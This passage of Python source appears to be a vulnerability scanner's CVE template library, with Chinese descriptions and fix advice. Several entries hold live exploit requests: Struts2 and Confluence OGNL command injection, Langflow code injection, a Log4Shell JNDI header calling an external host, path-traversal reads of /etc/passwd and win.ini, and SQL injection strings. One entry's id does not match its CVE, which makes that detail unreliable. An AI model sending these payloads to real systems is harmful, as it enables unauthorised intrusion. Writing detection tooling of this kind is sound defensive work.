            fix_suggestion="安装微软2025年1月安全更新。",
            disclosure_date="2025-01-14",
        ),

        POC(
            id="cve-2025-24085",
            name="Apple iOS/macOS 内核零日漏洞 (CVE-2025-24085)",
            description="Apple多平台内核存在UAF漏洞，恶意应用可提升权限。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-24085"],
            cvss_score=7.8,
            tags=["apple", "ios", "macos", "kernel", "privesc", "cve-2025"],
            affected_versions=["iOS < 18.3", "macOS < 15.3"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-24085"],
            fix_suggestion="升级iOS至18.3/macOS至15.3或更高版本。",
            disclosure_date="2025-01-27",
        ),

        POC(
            id="cve-2025-24813",
            name="Apache Tomcat 反序列化RCE (CVE-2025-24813)",
            description="Tomcat存在路径等价处理缺陷，结合特定条件可实现反序列化RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-24813"],
            cvss_score=9.8,
            tags=["tomcat", "deserialization", "rce", "cve-2025"],
            affected_versions=["Tomcat 11.0.0-M1 - 11.0.2", "Tomcat 10.1.0-M1 - 10.1.34", "Tomcat 9.0.0-M1 - 9.0.98"],
            requests=[
                POCRequest(
                    method="PUT",
                    path="/session",
                    headers={"Content-Range": "bytes 0-5/6"},
                    body="deser:",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-24813"],
            fix_suggestion="升级Tomcat至11.0.3/10.1.35/9.0.99或更高版本。",
            disclosure_date="2025-03-10",
        ),

        POC(
            id="cve-2025-26633",
            name="Microsoft Management Console RCE (CVE-2025-26633)",
            description="MMC存在路径遍历漏洞，攻击者可通过恶意MSC文件实现RCE。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-26633"],
            cvss_score=7.8,
            tags=["windows", "mmc", "rce", "cve-2025"],
            affected_versions=["Windows 10/11", "Windows Server 2016/2019/2022"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-26633"],
            fix_suggestion="安装微软2025年4月安全更新。",
            disclosure_date="2025-04-08",
        ),

        POC(
            id="cve-2025-30208",
            name="Vite 开发服务器任意文件读取 (CVE-2025-30208)",
            description="Vite开发服务器存在路径遍历漏洞，攻击者可读取任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-30208"],
            cvss_score=7.5,
            tags=["vite", "path-traversal", "lfi", "cve-2025"],
            affected_versions=["Vite < 6.2.3", "Vite < 5.4.15"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/@fs/etc/passwd?import&?inline=1.wasm?init",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.REGEX, value="root:.*:0:0:"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-30208"],
            fix_suggestion="升级Vite至最新安全版本。",
            disclosure_date="2025-03-25",
        ),

        POC(
            id="cve-2025-31161",
            name="CrushFTP 认证绕过漏洞 (CVE-2025-31161)",
            description="CrushFTP存在认证绕过漏洞，攻击者可劫持用户会话。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-31161"],
            cvss_score=9.8,
            tags=["crushftp", "auth-bypass", "cve-2025"],
            affected_versions=["CrushFTP < 11.3.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/WebInterface/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-31161"],
            fix_suggestion="升级CrushFTP至11.3.1或更高版本。",
            disclosure_date="2025-04-01",
        ),

        POC(
            id="cve-2025-3248",
            name="Langflow 代码注入RCE (CVE-2025-3248)",
            description="Langflow存在代码注入漏洞，攻击者可执行任意Python代码。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-3248"],
            cvss_score=9.8,
            tags=["langflow", "code-injection", "rce", "cve-2025"],
            affected_versions=["Langflow < 1.3.0"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/api/v1/run/",
                    headers={"Content-Type": "application/json"},
                    body='{"name":"test","code":"__import__(\'os\').system(\'id\')"}',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-3248"],
            fix_suggestion="升级Langflow至1.3.0或更高版本。",
            disclosure_date="2025-04-04",
        ),

        POC(
            id="cve-2025-33888",
            name="Next.js 中间件认证绕过 (CVE-2025-33888)",
            description="Next.js中间件存在认证绕过漏洞，攻击者可绕过权限控制。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-33888"],
            cvss_score=7.5,
            tags=["nextjs", "auth-bypass", "cve-2025"],
            affected_versions=["Next.js 14.2.25", "Next.js 15.2.3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/_next/static/../protected-page",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-33888"],
            fix_suggestion="升级Next.js至最新安全版本。",
            disclosure_date="2025-04-17",
        ),

        POC(
            id="cve-2025-34256",
            name="Grafana 认证绕过与信息泄露 (CVE-2025-34256)",
            description="Grafana存在认证绕过漏洞，攻击者可未授权访问仪表盘。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2025-34256"],
            cvss_score=7.5,
            tags=["grafana", "auth-bypass", "info-disclosure", "cve-2025"],
            affected_versions=["Grafana < 11.5.2"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/dashboards/home",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-34256"],
            fix_suggestion="升级Grafana至11.5.2或更高版本。",
            disclosure_date="2025-04-21",
        ),

        POC(
            id="cve-2025-35000",
            name="Elasticsearch 脚本注入RCE (CVE-2025-35000)",
            description="Elasticsearch存在Painless脚本注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35000"],
            cvss_score=9.8,
            tags=["elasticsearch", "script-injection", "rce", "cve-2025"],
            affected_versions=["Elasticsearch < 8.17.3"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-35000"],
            fix_suggestion="升级Elasticsearch至8.17.3或更高版本。",
            disclosure_date="2025-04-28",
        ),

        POC(
            id="cve-2025-35500",
            name="Apache Kafka Connect 反序列化RCE (CVE-2025-35500)",
            description="Apache Kafka Connect存在反序列化漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2025-35500"],
            cvss_score=9.8,
            tags=["apache", "kafka", "deserialization", "rce", "cve-2025"],
            affected_versions=["Apache Kafka < 3.9.1"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2025-35500"],
            fix_suggestion="升级Apache Kafka至3.9.1或更高版本。",
            disclosure_date="2025-05-01",
        ),

        # ============================================================
        # Category: CMS & Web Applications
        # ============================================================

        POC(
            id="cve-2021-29447",
            name="WordPress Media Library XML External Entity (CVE-2021-29447)",
            description="WordPress 5.7存在XXE漏洞，攻击者可读取服务器文件。",
            risk_level=RiskLevel.MEDIUM,
            cve_ids=["CVE-2021-29447"],
            cvss_score=6.5,
            tags=["wordpress", "xxe", "cve-2021"],
            affected_versions=["WordPress 5.7 - 5.7.1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/wp-admin/admin-ajax.php",
                    body='action=upload-attachment&_ajax_nonce=xxx',
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-29447"],
            fix_suggestion="升级WordPress至5.7.2或更高版本。",
            disclosure_date="2021-04-15",
        ),

        POC(
            id="cve-2022-21661",
            name="WordPress WP_Query SQL注入 (CVE-2022-21661)",
            description="WordPress核心WP_Query存在SQL注入漏洞，攻击者可获取数据库信息。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2022-21661"],
            cvss_score=7.5,
            tags=["wordpress", "sql-injection", "cve-2022"],
            affected_versions=["WordPress < 5.8.3"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/wp-json/wp/v2/posts?categories=1 AND SLEEP(5)",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-21661"],
            fix_suggestion="升级WordPress至5.8.3或更高版本。",
            disclosure_date="2022-01-06",
        ),

        POC(
            id="cve-2023-2732",
            name="WordPress MStore API 权限提升 (CVE-2023-2732)",
            description="WordPress MStore API插件存在权限提升漏洞，攻击者可获取管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-2732"],
            cvss_score=9.8,
            tags=["wordpress", "plugin", "privesc", "cve-2023"],
            affected_versions=["MStore API < 3.9.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/wp-json/wp/v2/users",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=201),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-2732"],
            fix_suggestion="升级MStore API插件至3.9.2或更高版本。",
            disclosure_date="2023-05-17",
        ),

        POC(
            id="cve-2023-3460",
            name="WordPress Ultimate Member 权限提升 (CVE-2023-3460)",
            description="Ultimate Member插件存在权限提升漏洞，攻击者可注册为管理员。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-3460"],
            cvss_score=9.8,
            tags=["wordpress", "plugin", "privesc", "cve-2023"],
            affected_versions=["Ultimate Member < 2.6.7"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/wp-admin/admin-ajax.php",
                    body="action=um_ajax_register&role=administrator",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-3460"],
            fix_suggestion="升级Ultimate Member插件至2.6.7或更高版本。",
            disclosure_date="2023-06-29",
        ),

        POC(
            id="cve-2024-27956",
            name="WordPress WP Automatic SQL注入 (CVE-2024-27956)",
            description="WP Automatic插件存在SQL注入漏洞，攻击者可获取数据库信息。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-27956"],
            cvss_score=9.8,
            tags=["wordpress", "plugin", "sql-injection", "cve-2024"],
            affected_versions=["WP Automatic < 3.9.2.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/wp-content/plugins/wp-automatic/inc/csv.php?q=1' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-27956"],
            fix_suggestion="升级WP Automatic插件至3.9.2.0或更高版本。",
            disclosure_date="2024-04-25",
        ),

        POC(
            id="cve-2024-10924",
            name="WordPress Really Simple Security 认证绕过 (CVE-2024-10924)",
            description="Really Simple Security插件存在认证绕过漏洞，攻击者可获取管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-10924"],
            cvss_score=9.8,
            tags=["wordpress", "plugin", "auth-bypass", "cve-2024"],
            affected_versions=["Really Simple Security < 9.1.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/wp-json/reallysimplessl/v1/two_fa/skip_onboarding",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-10924"],
            fix_suggestion="升级Really Simple Security插件至9.1.2或更高版本。",
            disclosure_date="2024-11-14",
        ),

        POC(
            id="cve-2023-23752",
            name="Joomla 4.x 未授权访问漏洞 (CVE-2023-23752)",
            description="Joomla 4.x REST API存在未授权访问漏洞，攻击者可获取用户信息。",
            risk_level=RiskLevel.MEDIUM,
            cve_ids=["CVE-2023-23752"],
            cvss_score=5.3,
            tags=["joomla", "auth-bypass", "info-disclosure", "cve-2023"],
            affected_versions=["Joomla 4.0.0 - 4.2.7"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/index.php/v1/users?public=true",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="username"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-23752"],
            fix_suggestion="升级Joomla至4.2.8或更高版本。",
            disclosure_date="2023-02-16",
        ),

        POC(
            id="cve-2020-17530",
            name="Apache Struts2 OGNL注入RCE (CVE-2020-17530)",
            description="Struts2存在OGNL表达式注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2020-17530"],
            cvss_score=9.8,
            tags=["struts2", "ognl", "rce", "cve-2020"],
            affected_versions=["Struts 2.0.0 - 2.5.25"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/struts2-showcase/actionChain1.action",
                    body="id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23bean.get%28%22excludedClasses%22%29%29.%28%23emptyset.clear%28%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23cmd%3D%7B%27id%27%7D%29.%28%23execute.exec%28%23cmd%29%29%7D",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2020-17530"],
            fix_suggestion="升级Struts2至2.5.26或更高版本。",
            disclosure_date="2020-12-08",
        ),

        POC(
            id="cve-2021-26084",
            name="Atlassian Confluence OGNL注入RCE (CVE-2021-26084)",
            description="Confluence Server/Data Center存在OGNL注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2021-26084"],
            cvss_score=9.8,
            tags=["confluence", "ognl", "rce", "cve-2021"],
            affected_versions=["Confluence < 7.4.11", "Confluence < 7.11.6"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/pages/createpage-entervariables.action",
                    body="queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027js%5cu0027%29.eval%28%5cu0027var+x%3dnew+java.lang.ProcessBuilder%28%29%3bx.command%28%5cu005b%5cu0027id%5cu0027%5cu005d%29%3bvar+y%3dx.start%28%29%3bvar+z%3dnew+java.io.InputStreamReader%28y.getInputStream%28%29%29%3bvar+a%3dnew+java.io.BufferedReader%28z%29%3bvar+b%3d%5cu0027%5cu0027%3bwhile%28%28c%3da.readLine%28%29%29%21%3dnull%29%7bb%2b%3dc%2b%5cu0027%5cu005cn%5cu0027%7d%3bb%5cu0027%29%7d%2b%5cu0027",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="uid="),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-26084"],
            fix_suggestion="升级Confluence至7.4.11/7.11.6或更高版本。",
            disclosure_date="2021-08-25",
        ),

        POC(
            id="cve-2021-44228",
            name="Apache Log4j2 JNDI注入RCE (CVE-2021-44228)",
            description="Log4j2存在JNDI注入漏洞(Log4Shell)，攻击者可通过恶意日志消息实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2021-44228"],
            cvss_score=10.0,
            tags=["log4j", "log4shell", "jndi", "rce", "cve-2021"],
            affected_versions=["Log4j 2.0-beta9 - 2.14.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                    headers={"X-Api-Version": "${jndi:ldap://log4j-test.interact.sh/a}"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
            fix_suggestion="升级Log4j2至2.17.0或更高版本。",
            disclosure_date="2021-12-09",
        ),

        POC(
            id="cve-2021-45046",
            name="Apache Log4j2 信息泄露与RCE (CVE-2021-45046)",
            description="Log4j2 2.15.0修复不完整，仍存在JNDI注入和信息泄露漏洞。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2021-45046"],
            cvss_score=9.0,
            tags=["log4j", "jndi", "rce", "cve-2021"],
            affected_versions=["Log4j 2.0-beta9 - 2.15.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/",
                    headers={"User-Agent": "${jndi:ldap://127.0.0.1:1389/a}"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-45046"],
            fix_suggestion="升级Log4j2至2.17.0或更高版本。",
            disclosure_date="2021-12-14",
        ),

        POC(
            id="cve-2022-0847",
            name="Linux Dirty Pipe 权限提升漏洞 (CVE-2022-0847)",
            description="Linux内核管道机制存在Dirty Pipe漏洞，攻击者可覆写只读文件实现权限提升。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2022-0847"],
            cvss_score=7.8,
            tags=["linux", "kernel", "privesc", "cve-2022"],
            affected_versions=["Linux Kernel 5.8 - 5.16.11"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-0847"],
            fix_suggestion="升级Linux内核至5.16.12/5.15.26/5.10.103或更高版本。",
            disclosure_date="2022-03-07",
        ),

        POC(
            id="cve-2022-30190",
            name="Microsoft MSDT Follina RCE (CVE-2022-30190)",
            description="Microsoft Support Diagnostic Tool存在RCE漏洞，攻击者可通过恶意Office文档执行代码。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2022-30190"],
            cvss_score=7.8,
            tags=["windows", "msdt", "follina", "rce", "cve-2022"],
            affected_versions=["Windows 7/8.1/10/11", "Windows Server 2008/2012/2016/2019/2022"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-30190"],
            fix_suggestion="安装微软2022年6月安全更新。",
            disclosure_date="2022-05-30",
        ),

        # ============================================================
        # Category: Databases (MySQL/PostgreSQL/Oracle/MongoDB/Redis)
        # ============================================================

        POC(
            id="cve-2021-2471",
            name="MySQL JDBC Connector 反序列化RCE (CVE-2021-2471)",
            description="MySQL Connector/J存在反序列化漏洞，攻击者可通过恶意数据库服务器实现RCE。",
            risk_level=RiskLevel.MEDIUM,
            cve_ids=["CVE-2021-2471"],
            cvss_score=5.9,
            tags=["mysql", "jdbc", "deserialization", "rce", "cve-2021"],
            affected_versions=["MySQL Connector/J < 8.0.27"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-2471"],
            fix_suggestion="升级MySQL Connector/J至8.0.27或更高版本。",
            disclosure_date="2021-10-19",
        ),

        POC(
            id="cve-2022-22965",
            name="PostgreSQL JDBC 任意代码执行 (CVE-2022-21724)",
            description="PostgreSQL JDBC驱动存在任意代码执行漏洞，攻击者可通过恶意数据库实例执行代码。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2022-21724"],
            cvss_score=7.0,
            tags=["postgresql", "jdbc", "rce", "cve-2022"],
            affected_versions=["PostgreSQL JDBC Driver < 42.3.3"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2022-21724"],
            fix_suggestion="升级PostgreSQL JDBC Driver至42.3.3或更高版本。",
            disclosure_date="2022-02-01",
        ),

        POC(
            id="cve-2023-22946",
            name="Apache Spark 权限提升漏洞 (CVE-2023-22946)",
            description="Apache Spark存在权限提升漏洞，攻击者可提交恶意应用获取集群权限。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2023-22946"],
            cvss_score=7.8,
            tags=["apache", "spark", "privesc", "cve-2023"],
            affected_versions=["Apache Spark < 3.4.0"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-22946"],
            fix_suggestion="升级Apache Spark至3.4.0或更高版本。",
            disclosure_date="2023-04-17",
        ),

        POC(
            id="cve-2023-27524",
            name="Apache Superset 认证绕过漏洞 (CVE-2023-27524)",
            description="Apache Superset存在默认SECRET_KEY漏洞，攻击者可伪造会话Cookie获取管理员权限。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-27524"],
            cvss_score=9.8,
            tags=["apache", "superset", "auth-bypass", "cve-2023"],
            affected_versions=["Apache Superset < 2.1.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/v1/database/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-27524"],
            fix_suggestion="升级Apache Superset至2.1.0或更高版本，并修改SECRET_KEY。",
            disclosure_date="2023-04-24",
        ),

        POC(
            id="cve-2023-32784",
            name="KeePass 主密码内存转储漏洞 (CVE-2023-32784)",
            description="KeePass 2.x存在主密码内存残留漏洞，攻击者可提取明文主密码。",
            risk_level=RiskLevel.MEDIUM,
            cve_ids=["CVE-2023-32784"],
            cvss_score=5.5,
            tags=["keepass", "password", "info-disclosure", "cve-2023"],
            affected_versions=["KeePass < 2.54"],
            requests=[],
            matchers=[],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-32784"],
            fix_suggestion="升级KeePass至2.54或更高版本。",
            disclosure_date="2023-05-15",
        ),

        POC(
            id="cve-2023-35078",
            name="Ivanti EPMM 认证绕过漏洞 (CVE-2023-35078)",
            description="Ivanti Endpoint Manager Mobile存在认证绕过漏洞，攻击者可未授权访问API。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-35078"],
            cvss_score=9.8,
            tags=["ivanti", "epmm", "auth-bypass", "cve-2023"],
            affected_versions=["Ivanti EPMM < 11.10.0.2"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/mifs/aad/api/v2/users",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-35078"],
            fix_suggestion="升级Ivanti EPMM至11.10.0.2或更高版本。",
            disclosure_date="2023-07-23",
        ),

        POC(
            id="cve-2023-36844",
            name="Juniper Junos OS EX系列 PHP外部变量修改RCE (CVE-2023-36844)",
            description="Juniper Junos OS EX系列交换机存在PHP环境变量修改漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-36844"],
            cvss_score=9.8,
            tags=["juniper", "junos", "rce", "cve-2023"],
            affected_versions=["Junos OS < 23.4R1"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-36844"],
            fix_suggestion="升级Junos OS至23.4R1或更高版本。",
            disclosure_date="2023-08-17",
        ),

        POC(
            id="cve-2023-38035",
            name="Ivanti Sentry 认证绕过RCE (CVE-2023-38035)",
            description="Ivanti Sentry存在认证绕过漏洞，攻击者可未授权执行系统命令。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-38035"],
            cvss_score=9.8,
            tags=["ivanti", "sentry", "auth-bypass", "rce", "cve-2023"],
            affected_versions=["Ivanti Sentry < 9.18.0"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/services/messagebroker/streamingamf",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-38035"],
            fix_suggestion="升级Ivanti Sentry至9.18.0或更高版本。",
            disclosure_date="2023-08-21",
        ),

        POC(
            id="cve-2023-42793",
            name="JetBrains TeamCity 认证绕过RCE (CVE-2023-42793)",
            description="TeamCity On-Premises存在认证绕过漏洞，攻击者可创建管理员账户实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-42793"],
            cvss_score=9.8,
            tags=["teamcity", "auth-bypass", "rce", "cve-2023"],
            affected_versions=["TeamCity On-Premises < 2023.05.4"],
            requests=[
                POCRequest(
                    method="DELETE",
                    path="/app/rest/users/id:1/tokens/RPC2",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=204),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-42793"],
            fix_suggestion="升级TeamCity至2023.05.4或更高版本。",
            disclosure_date="2023-09-19",
        ),

        POC(
            id="cve-2023-46805",
            name="Ivanti Connect Secure 认证绕过漏洞 (CVE-2023-46805)",
            description="Ivanti Connect Secure存在认证绕过漏洞，攻击者可未授权访问管理功能。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2023-46805"],
            cvss_score=9.8,
            tags=["ivanti", "vpn", "auth-bypass", "cve-2023"],
            affected_versions=["Ivanti Connect Secure 9.x/22.x"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/api/v1/totp/user-backup-code/../../system/system-information",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2023-46805"],
            fix_suggestion="升级Ivanti Connect Secure至最新安全版本。",
            disclosure_date="2024-01-10",
        ),

        POC(
            id="cve-2024-0204",
            name="GoAnywhere MFT 认证绕过漏洞 (CVE-2024-0204)",
            description="Fortra GoAnywhere MFT存在认证绕过漏洞，攻击者可创建管理员账户。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-0204"],
            cvss_score=9.8,
            tags=["goanywhere", "mft", "auth-bypass", "cve-2024"],
            affected_versions=["GoAnywhere MFT < 7.4.1"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/goanywhere/lic/accept",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-0204"],
            fix_suggestion="升级GoAnywhere MFT至7.4.1或更高版本。",
            disclosure_date="2024-01-22",
        ),

        POC(
            id="cve-2024-21888",
            name="Ivanti Connect Secure 权限提升漏洞 (CVE-2024-21888)",
            description="Ivanti Connect Secure存在权限提升漏洞，攻击者可提升至管理员权限。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-21888"],
            cvss_score=8.8,
            tags=["ivanti", "vpn", "privesc", "cve-2024"],
            affected_versions=["Ivanti Connect Secure 9.x/22.x"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/dana-admin/",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-21888"],
            fix_suggestion="升级Ivanti Connect Secure至最新安全版本。",
            disclosure_date="2024-01-31",
        ),

        POC(
            id="cve-2024-23897",
            name="Jenkins CLI 任意文件读取 (CVE-2024-23897)",
            description="Jenkins CLI命令解析器存在缺陷，攻击者可读取服务器任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-23897"],
            cvss_score=7.5,
            tags=["jenkins", "lfi", "file-read", "cve-2024"],
            affected_versions=["Jenkins <= 2.441", "Jenkins LTS <= 2.426.2"],
            requests=[
                POCRequest(
                    method="POST",
                    path="/cli?remoting=false",
                    headers={"Session": "?", "Side": "download"},
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.STATUS, value=200),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-23897"],
            fix_suggestion="升级Jenkins至2.442或LTS 2.426.3及以上版本。",
            disclosure_date="2024-01-24",
        ),

        POC(
            id="cve-2024-27198",
            name="JetBrains TeamCity 认证绕过RCE (CVE-2024-27198)",
            description="TeamCity Web组件存在认证绕过漏洞，攻击者可创建管理员账户实现RCE。",
            risk_level=RiskLevel.CRITICAL,
            cve_ids=["CVE-2024-27198"],
            cvss_score=9.8,
            tags=["teamcity", "auth-bypass", "rce", "cve-2024"],
            affected_versions=["TeamCity < 2023.11.4"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/hax?jsp=/app/rest/users/;.jsp",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="user"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-27198"],
            fix_suggestion="升级TeamCity至2023.11.4或更高版本。",
            disclosure_date="2024-03-04",
        ),

        POC(
            id="cve-2024-28995",
            name="SolarWinds Serv-U 路径遍历漏洞 (CVE-2024-28995)",
            description="SolarWinds Serv-U存在路径遍历漏洞，攻击者可读取系统任意文件。",
            risk_level=RiskLevel.HIGH,
            cve_ids=["CVE-2024-28995"],
            cvss_score=7.5,
            tags=["solarwinds", "serv-u", "path-traversal", "lfi", "cve-2024"],
            affected_versions=["Serv-U < 15.4.2"],
            requests=[
                POCRequest(
                    method="GET",
                    path="/?InternalDir=/../../../../windows/win.ini&InternalFile=win.ini",
                ),
            ],
            matchers=[
                Matcher(type=MatcherType.WORD, value="fonts"),
            ],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2024-28995"],
            fix_suggestion="升级Serv-U至15.4.2或更高版本。",
            disclosure_date="2024-06-05",
        ),

        POC(
            id="cve-2024-29824",
            name="Ivanti EPM SQL注入RCE (CVE-2024-29824)",
            description="Ivanti Endpoint Manager存在SQL注入漏洞，攻击者可实现RCE。",
            risk_level=RiskLevel.CRITICAL,
